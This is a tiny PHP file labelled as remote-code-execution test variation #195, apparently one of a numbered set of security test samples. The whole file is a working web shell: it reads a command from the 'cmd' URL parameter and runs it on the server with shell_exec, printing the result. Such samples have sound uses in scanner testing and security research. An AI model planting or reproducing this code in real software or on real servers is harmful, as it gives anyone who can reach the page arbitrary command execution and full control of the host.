<?php
// RCE test variation #195
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>